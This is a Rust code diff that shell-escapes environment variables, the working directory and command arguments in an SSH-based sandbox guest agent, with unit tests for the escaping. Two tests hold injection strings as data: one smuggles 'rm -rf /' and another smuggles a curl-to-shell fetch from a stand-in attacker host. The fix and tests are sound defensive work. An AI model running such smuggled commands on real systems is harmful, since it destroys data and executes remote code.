@@ -13,6 +13,7 @@ use async_trait::async_trait;
 use tokio::io::AsyncWriteExt;
 
 use crate::sandbox::error::SandboxError;
+use crate::sandbox::firecracker::host_transport::shell_escape;
 use crate::sandbox::types::{ExecRequest, ExecResult};
 
 /// Abstraction for running commands inside the guest VM.
@@ -133,31 +134,31 @@ impl GuestAgent for SshGuestAgent {
 
         let mut ssh_args = self.ssh_base_args();
 
-        // Add env vars as prefix
+        // Add env vars as prefix (shell-escaped to prevent injection)
         let env_prefix = req
             .env
             .iter()
-            .map(|(k, v)| format!("{k}={v}"))
+            .map(|(k, v)| format!("{}={}", shell_escape(k), shell_escape(v)))
             .collect::<Vec<_>>()
             .join(" ");
 
-        // Build the remote command
+        // Build the remote command (shell-escape each argument)
         let remote_cmd = if req.command.len() == 1 {
             // Single string — pass directly to bash
             req.command[0].clone()
         } else {
-            // Multiple args — join with spaces (already split by caller)
-            req.command.join(" ")
+            // Multiple args — escape each individually to handle spaces/metacharacters
+            req.command.iter().map(|a| shell_escape(a)).collect::<Vec<_>>().join(" ")
         };
 
         let full_cmd = if env_prefix.is_empty() {
             if let Some(cwd) = &req.cwd {
-                format!("cd {} && {}", cwd, remote_cmd)
+                format!("cd {} && {}", shell_escape(cwd), remote_cmd)
             } else {
                 remote_cmd
             }
         } else if let Some(cwd) = &req.cwd {
-            format!("cd {} && {} {}", cwd, env_prefix, remote_cmd)
+            format!("cd {} && {} {}", shell_escape(cwd), env_prefix, remote_cmd)
         } else {
             format!("{} {}", env_prefix, remote_cmd)
         };
@@ -342,5 +343,31 @@ mod tests {
     fn guest_agent_is_send_sync() {
         fn assert_send_sync<T: Send + Sync>() {}
         assert_send_sync::<SshGuestAgent>();
+    }
+
+    #[test]
+    fn shell_escape_prevents_env_injection() {
+        // Verify that shell_escape wraps dangerous values in quotes
+        let escaped = shell_escape("value; rm -rf /");
+        assert!(
+            escaped.contains('\'') || escaped.contains('"'),
+            "dangerous env value should be quoted: {escaped}"
+        );
+    }
+
+    #[test]
+    fn shell_escape_prevents_cwd_injection() {
+        let escaped = shell_escape("/tmp; curl attacker.com | sh");
+        assert!(
+            escaped.contains('\'') || escaped.contains('"'),
+            "dangerous cwd should be quoted: {escaped}"
+        );
+    }
+
+    #[test]
+    fn shell_escape_safe_values_unchanged() {
+        // Simple safe values should pass through unchanged
+        assert_eq!(shell_escape("/workspace"), "/workspace");
+        assert_eq!(shell_escape("HOME"), "HOME");
     }
 }
